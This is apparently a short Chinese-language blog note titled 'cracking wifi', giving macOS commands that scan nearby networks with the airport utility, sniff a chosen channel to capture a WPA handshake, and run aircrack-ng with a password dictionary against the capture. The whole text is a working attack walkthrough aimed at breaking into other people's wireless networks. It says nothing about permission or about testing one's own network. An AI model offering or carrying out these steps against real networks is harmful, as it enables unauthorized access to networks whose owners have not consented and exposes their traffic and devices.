---
title: 破解wifi
---

### 准备安装macport和aircrack-ng 百度有很多

### 通过airport查看附近的wifi
#### 1.没有把airport添加到系统命令的
    sudo /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -s
#### 2.把airport添加到系统命令
    sudo ln -s /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport /usr/local/Cellar/aircrack-ng

### 开始查看附近的wifi 
    airport -s

### SSID 是 wifi名称，RSSI 是信号强度，CHANNEL 是信道。选择RSSI比较小的，越小信号越强，可以这么理解(负数的话，越大越好)

### 查看自己的网卡信息
    点击桌面左上角的苹果   系统信息   系统报告   wifi  看是en0还是en1

### 看是抓包
    sudo airport en0 sniff 1    //en0是你的网卡的信息，1是你要破解的wifi的信道CHANNEL
### 打开finder，快捷键是： command+alt+space  点击左上角的：前往 或者快捷键是comman+shift+g  查看刚刚的抓包文件
    /tmp

### 在桌面上创建一个文件夹wifi   把刚刚的抓包文件和密码字典放一起 分别命名为01

### 查看是否抓到包
    cd ~/Desktop/wifi
    aircrack-ng -w 01.txt 01.cap

### 在命令行里面查找1 handshake command+f 快捷键：command+f，并查看对应的行数 ，拉到命令行的最下方找到：index number of target network ?     在其后面输入刚刚对应的行数


### 接下来就是漫长的等待